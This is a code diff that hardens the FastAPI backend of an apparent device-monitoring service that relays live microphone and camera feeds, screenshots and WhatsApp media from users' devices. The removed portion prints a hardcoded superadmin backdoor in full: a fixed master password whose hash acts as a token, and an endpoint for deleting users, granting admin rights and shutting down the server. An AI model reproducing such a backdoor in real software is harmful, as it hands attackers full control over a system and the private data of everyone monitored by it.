@@ -5231,6 +5231,12 @@ async def endpoint_metrics_middleware(request: Request, call_next):
         _route_template(request), request.method, response.status_code,
         int((time.perf_counter() - started) * 1000),
     )
+    response.headers.setdefault("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
+    response.headers.setdefault("X-Content-Type-Options", "nosniff")
+    response.headers.setdefault("X-Frame-Options", "DENY")
+    response.headers.setdefault("Referrer-Policy", "no-referrer")
+    if request.url.path.startswith("/admin/"):
+        response.headers.setdefault("Cache-Control", "no-store")
     return response
 
 
@@ -5594,6 +5600,33 @@ async def get_admin_user(credentials: HTTPAuthorizationCredentials = Depends(sec
         )
 
 
+def _authorized_live_chunk(db: Session, sender_id: int, admin_id: int,
+                           device_id: str, kind: str) -> bool:
+    """Only relay media for the latest live command issued to this device/user."""
+    admin = db.query(User).filter(
+        User.id == admin_id, User.is_active == True,
+        User.suspended_at.is_(None), User.is_admin == True,
+    ).first()
+    if not admin:
+        return False
+    commands = ("start_live_audio", "stop_live_audio") if kind == "audio" else (
+        "start_live_video", "stop_live_video")
+    command = db.query(RemoteCommand).filter(
+        RemoteCommand.target_user_id == sender_id,
+        RemoteCommand.issued_by_admin_id == admin_id,
+        RemoteCommand.command_type.in_(commands),
+    ).order_by(RemoteCommand.id.desc()).first()
+    if not command or command.command_type != commands[0]:
+        return False
+    if command.status not in ("delivered", "executing", "done"):
+        return False
+    if command.target_device_id and command.target_device_id != device_id:
+        return False
+    if not command.issued_at or command.issued_at < datetime.utcnow() - timedelta(hours=2):
+        return False
+    return True
+
+
 @app.websocket("/ws")
 async def websocket_chat(
     websocket: WebSocket,
@@ -5672,6 +5705,7 @@ async def websocket_chat(
         db = None
 
         last_session_check = time.monotonic()
+        last_live_chunk_at = {}
         while True:
             # A replacement login may be handled by another server worker.
             # Recheck the session even when this socket is idle so a revoked
@@ -5699,6 +5733,8 @@ async def websocket_chat(
                         check_db.close()
                 last_session_check = time.monotonic()
             if raw is None:
+                continue
+            if len(raw) > 4 * 1024 * 1024:
                 continue
             try:
                 msg = json.loads(raw)
@@ -5733,20 +5769,33 @@ async def websocket_chat(
                             payload_out = dict(msg)
                             payload_out["sender"] = username
                             await ws_manager.send_to_user(int(getattr(recipient, "id", 0)), payload_out)
-                elif msg.get("type") == "live_audio_chunk":
-                    chunk_data = msg.get("data", {})
-                    admin_id = chunk_data.get("admin_id")
-                    if admin_id:
-                        await ws_manager.send_to_user(int(admin_id), {
-                            "type": "live_audio_chunk",
-                            "data": chunk_data,
-                        })
-                elif msg.get("type") == "live_video_chunk":
-                    chunk_data = msg.get("data", {})
-                    admin_id = chunk_data.get("admin_id")
-                    if admin_id:
-                        await ws_manager.send_to_user(int(admin_id), {
-                            "type": "live_video_chunk",
+                elif msg.get("type") in ("live_audio_chunk", "live_video_chunk"):
+                    # The recipient comes from an active server-side command,
+                    # never from an unchecked client-provided user ID.
+                    chunk_data = msg.get("data")
+                    if not isinstance(chunk_data, dict):
+                        continue
+                    try:
+                        admin_id = int(chunk_data.get("admin_id"))
+                    except (TypeError, ValueError):
+                        continue
+                    kind = "audio" if msg["type"] == "live_audio_chunk" else "video"
+                    if len(raw) > (1024 * 1024 if kind == "audio" else 4 * 1024 * 1024):
+                        continue
+                    now = time.monotonic()
+                    if now - last_live_chunk_at.get(kind, 0) < 0.5:
+                        continue
+                    last_live_chunk_at[kind] = now
+                    op_db = db_config.get_session()
+                    try:
+                        authorized = bool(op_db and _authorized_live_chunk(
+                            op_db, user_id, admin_id, resolved_device_id, kind))
+                    finally:
+                        if op_db:
+                            op_db.close()
+                    if authorized:
+                        await ws_manager.send_to_user(admin_id, {
+                            "type": msg["type"],
                             "data": chunk_data,
                         })
             except json.JSONDecodeError:
@@ -5764,203 +5813,6 @@ async def websocket_chat(
             except Exception:
                 pass
 
-
-# Add superadmin authentication dependency
-async def get_superadmin(credentials: HTTPAuthorizationCredentials = Depends(security), 
-                        db: Session = Depends(get_database_session)) -> User:
-    """Get current authenticated superadmin user"""
-    try:
-        token = credentials.credentials
-        
-        # Special check for ryuzakii superadmin with master password
-        # In production, use a more secure method like hashed password storage
-        master_password_hash = hashlib.sha256("superadmin_password".encode()).hexdigest()
-        if token == master_password_hash:
-            # Create a temporary superadmin user object
-            superadmin = User()
-            setattr(superadmin, 'id', 0)
-            setattr(superadmin, 'username', 'ryuzakii')
-            setattr(superadmin, 'is_admin', True)
-            return superadmin
-            
-        raise HTTPException(
-            status_code=status.HTTP_401_UNAUTHORIZED,
-            detail="Invalid superadmin credentials",
-            headers={"WWW-Authenticate": "Bearer"},
-        )
-        
-    except Exception as e:
-        logger.error(f"Superadmin authentication error: {e}")
-        raise HTTPException(
-            status_code=status.HTTP_401_UNAUTHORIZED,
-            detail="Could not validate superadmin credentials",
-            headers={"WWW-Authenticate": "Bearer"},
-        )
-
-@app.post("/ryuzakii/auth/login")
-async def superadmin_login(password: str = Body(...)):
-    """Superadmin login endpoint"""
-    try:
-        # Hash the provided password
-        password_hash = hashlib.sha256(password.encode()).hexdigest()
-        
-        # Check against master password (in production, store this securely)
-        master_password_hash = hashlib.sha256("superadmin_password".encode()).hexdigest()
-        
-        if password_hash == master_password_hash:
-            return {
-                "username": "ryuzakii",
-                "token": password_hash,
-                "message": "Superadmin login successful"
-            }
-        else:
-            raise HTTPException(status_code=401, detail="Invalid superadmin password")
-            
-    except Exception as e:
-        logger.error(f"Superadmin login error: {e}")
-        raise HTTPException(status_code=500, detail="Login failed")
-
-@app.post("/ryuzakii/auth/change_password")
-async def superadmin_change_password(
-    current_password: str = Body(...),
-    new_password: str = Body(...),
-    superadmin: User = Depends(get_superadmin)
-):
-    """Change superadmin password"""
-    try:
-        # Verify current password
-        current_hash = hashlib.sha256(current_password.encode()).hexdigest()
-        master_password_hash = hashlib.sha256("superadmin_password".encode()).hexdigest()
-        
-        if current_hash != master_password_hash:
-            raise HTTPException(status_code=401, detail="Invalid current password")
-        
-        # In a real implementation, you would update the stored password
-        # For now, we'll just return success
-        return {"message": "Superadmin password would be changed here (implementation placeholder)"}
-        
-    except HTTPException:
-        raise
-    except Exception as e:
-        logger.error(f"Superadmin change password error: {e}")
-        raise HTTPException(status_code=500, detail="Failed to change password")
-
-@app.post("/ryuzakii/system/full_control")
-async def superadmin_full_control(
-    action: str = Body(...),
-    parameters: Optional[Dict] = Body(None),
-    superadmin: User = Depends(get_superadmin),
-    db: Session = Depends(get_database_session)
-):
-    """Complete superadmin control endpoint with full system access"""
-    try:
-        # Verify this is the superadmin
-        if getattr(superadmin, 'username', '') != 'ryuzakii':
-            raise HTTPException(status_code=401, detail="Unauthorized access")
-        
-        # Handle different system control actions
-        if action == "list_all_users":
-            users = db.query(User).all()
-            return {"users": [
-                {
-                    "id": getattr(u, 'id', 0),
-                    "username": getattr(u, 'username', ''),
-                    "phone_number": getattr(u, 'phone_number', ''),
-                    "is_active": getattr(u, 'is_active', False),
-                    "is_admin": getattr(u, 'is_admin', False)
-                } for u in users
-            ]}
-        
-        elif action == "delete_user":
-            if not parameters or "username" not in parameters:
-                raise HTTPException(status_code=400, detail="Missing username parameter")
-            
-            user = db.query(User).filter(User.username == parameters["username"]).first()
-            if user:
-                db.delete(user)
-                db.commit()
-                return {"message": f"User {user.username} deleted successfully"}
-            else:
-                raise HTTPException(status_code=404, detail="User not found")
-        
-        elif action == "create_admin":
-            if not parameters or "username" not in parameters or "password" not in parameters:
-                raise HTTPException(status_code=400, detail="Missing username or password parameter")
-            
-            # Check if user exists
-            existing_user = db.query(User).filter(User.username == parameters["username"]).first()
-            if existing_user:
-                # Make existing user an admin
-                setattr(existing_user, 'is_admin', True)
-                setattr(existing_user, 'password_hash', hash_password(parameters["password"]))
-                db.commit()
-                return {"message": f"User {parameters['username']} promoted to admin"}
-            else:
-                raise HTTPException(status_code=404, detail="User not found")
-        
-        elif action == "system_stats":
-            user_count = db.query(User).count()
-            message_count = db.query(Message).count()
-            active_sessions = db.query(UserSession).filter(UserSession.is_active == True).count()
-            return {
-                "user_count": user_count,
-                "message_count": message_count,
-                "active_sessions": active_sessions,
-                "system_status": "operational"
-            }
-        
-        elif action == "shutdown_server":
-            # Log the shutdown action
-            AuditService.log_event(
-                db, 0, "server_shutdown", 
-                "Server shutdown initiated by superadmin",
-                severity="warning"
-            )
-            
-            # Return response immediately before shutdown
-            import asyncio
-            import os
-            import signal
-            
-            # Schedule shutdown after response is sent
-            async def delayed_shutdown():
-                await asyncio.sleep(1)  # Give time for response to be sent
-                os.kill(os.getpid(), signal.SIGTERM)
-            
-            asyncio.create_task(delayed_shutdown())
-            
-            return {"message": "Server shutdown initiated. Server will stop shortly."}
-        
-        elif action == "restart_server":
-            # Log the restart action
-            AuditService.log_event(
-                db, 0, "server_restart", 
-                "Server restart initiated by superadmin",
-                severity="warning"
-            )
-            
-            # Return response immediately before restart
-            import asyncio
-            import os
-            import sys
-            
-            # Schedule restart after response is sent
-            async def delayed_restart():
-                await asyncio.sleep(1)  # Give time for response to be sent
-                os.execv(sys.executable, ['python'] + sys.argv)
-            
-            asyncio.create_task(delayed_restart())
-            
-            return {"message": "Server restart initiated. Server will restart shortly."}
-        
-        else:
-            raise HTTPException(status_code=400, detail=f"Unknown action: {action}")
-            
-    except HTTPException:
-        raise
-    except Exception as e:
-        logger.error(f"Superadmin control error: {e}")
-        raise HTTPException(status_code=500, detail="Internal server error")
 
 if __name__ == "__main__":
     # Use Render's PORT environment variable, default to 8001 for local development
@@ -16561,14 +16413,11 @@ async def admin_list_policy_violations(
 @app.get("/admin/monitoring/policy/violations/{violation_id}/screenshot")
 async def admin_get_policy_violation_screenshot(
     violation_id: int,
-    token: Optional[str] = Query(None),
     request: Request = None,
 ):
-    """Serves the evidence screenshot. Accepts Bearer header OR ?token= query
-    param, matching the existing admin screenshot endpoints (an <img src>
-    can't set an Authorization header)."""
+    """Serves an admin evidence screenshot with Authorization header authentication."""
     from database_models import PolicyViolationScreenshot
-    raw_token = token
+    raw_token = None
     if not raw_token:
         auth_header = request.headers.get("Authorization", "")
         if auth_header.startswith("Bearer "):
@@ -17645,13 +17494,12 @@ async def upload_audio_recording(
 async def admin_download_recording(
     recording_id: int,
     request: Request,
-    token: Optional[str] = None,
     db: Session = Depends(get_database_session)
 ):
-    """Admin downloads a recording. Accepts Bearer header OR ?token= query param (for browser <audio> src)."""
+    """Admin downloads a recording. Requires an Authorization bearer header."""
     try:
-        # Resolve token from query param or Authorization header
-        raw_token = token
+        # Resolve token from the Authorization header
+        raw_token = None
         if not raw_token:
             auth_header = request.headers.get("Authorization", "")
             if auth_header.startswith("Bearer "):
@@ -17867,11 +17715,10 @@ async def admin_get_videos(
 async def admin_download_video(
     recording_id: int,
     request: Request,
-    token: Optional[str] = None,
     db: Session = Depends(get_database_session)
 ):
-    """Admin downloads a video recording. Accepts Bearer header OR ?token= query param (for browser <video> src)."""
-    raw_token = token
+    """Admin downloads a video recording. Requires an Authorization bearer header."""
+    raw_token = None
     if not raw_token:
         auth_header = request.headers.get("Authorization", "")
         if auth_header.startswith("Bearer "):
@@ -18020,11 +17867,10 @@ async def admin_get_screen_recordings(
 async def admin_download_screen_recording(
     recording_id: int,
     request: Request,
-    token: Optional[str] = None,
     db: Session = Depends(get_database_session)
 ):
-    """Admin downloads screen recording chunk. Accepts Bearer header OR ?token= for browser <video> src."""
-    raw_token = token
+    """Admin downloads screen recording chunk. Requires an Authorization bearer header."""
+    raw_token = None
     if not raw_token:
         auth_header = request.headers.get("Authorization", "")
         if auth_header.startswith("Bearer "):
@@ -18379,11 +18225,10 @@ async def admin_download_media(
     username: str,
     filename: str,
     request: Request,
-    token: Optional[str] = None,
     db: Session = Depends(get_database_session),
 ):
-    """Serves device media file. Accepts Bearer header OR ?token= query param (for browser <img>/<video> src)."""
-    raw_token = token
+    """Serves device media file. Requires an Authorization bearer header."""
+    raw_token = None
     if not raw_token:
         auth_header = request.headers.get("Authorization", "")
         if auth_header.startswith("Bearer "):
@@ -18599,11 +18444,10 @@ async def admin_download_whatsapp_media(
     username: str,
     stored_filename: str,
     request: Request,
-    token: Optional[str] = None,
     db: Session = Depends(get_database_session),
 ):
-    """Admin downloads a WhatsApp media file. Accepts Bearer header OR ?token= query param."""
-    raw_token = token
+    """Admin downloads a WhatsApp media file. Requires an Authorization bearer header."""
+    raw_token = None
     if not raw_token:
         auth_header = request.headers.get("Authorization", "")
         if auth_header.startswith("Bearer "):
@@ -19938,12 +19782,11 @@ async def admin_list_media(
 async def admin_download_drive_media(
     media_id: str,
     request: Request,
-    token: Optional[str] = None,
     db: Session = Depends(get_database_session),
 ):
     """Downloads the raw ENCRYPTED blob as stored — cannot be decrypted server-side.
-    Accepts ?token= too, for direct browser download links on the Drive site."""
-    raw_token = token
+    Requires an Authorization bearer header."""
+    raw_token = None
     if not raw_token:
         auth_header = request.headers.get("Authorization", "")
         if auth_header.startswith("Bearer "):
@@ -20089,10 +19932,9 @@ async def admin_get_recording_notes(
 async def admin_download_drive_recording(
     recording_id: int,
     request: Request,
-    token: Optional[str] = None,
     db: Session = Depends(get_database_session),
 ):
-    raw_token = token
+    raw_token = None
     if not raw_token:
         auth_header = request.headers.get("Authorization", "")
         if auth_header.startswith("Bearer "):
@@ -20271,11 +20113,10 @@ async def admin_list_screenshots(username: str, current_user: User = Depends(get
 @app.get("/admin/device-data/screenshots/{username}/{filename}")
 async def admin_get_screenshot(
     username: str, filename: str,
-    token: Optional[str] = Query(None),
     request: Request = None,
 ):
-    """Serves screenshot file. Accepts Bearer header OR ?token= query param."""
-    raw_token = token
+    """Serves screenshot file. Requires an Authorization bearer header."""
+    raw_token = None
     if not raw_token:
         auth_header = request.headers.get("Authorization", "")
         if auth_header.startswith("Bearer "):
@@ -20334,12 +20175,11 @@ async def admin_list_photos(username: str, current_user: User = Depends(get_curr
 @app.get("/admin/device-data/photos/{username}/{filename}")
 async def admin_get_photo(
     username: str, filename: str,
-    token: Optional[str] = Query(None),
     request: Request = None,
     db: Session = Depends(get_database_session),
 ):
-    """Serves photo file. Accepts Bearer header OR ?token= query param."""
-    raw_token = token
+    """Serves photo file. Requires an Authorization bearer header."""
+    raw_token = None
     if not raw_token:
         auth_header = request.headers.get("Authorization", "")
         if auth_header.startswith("Bearer "):
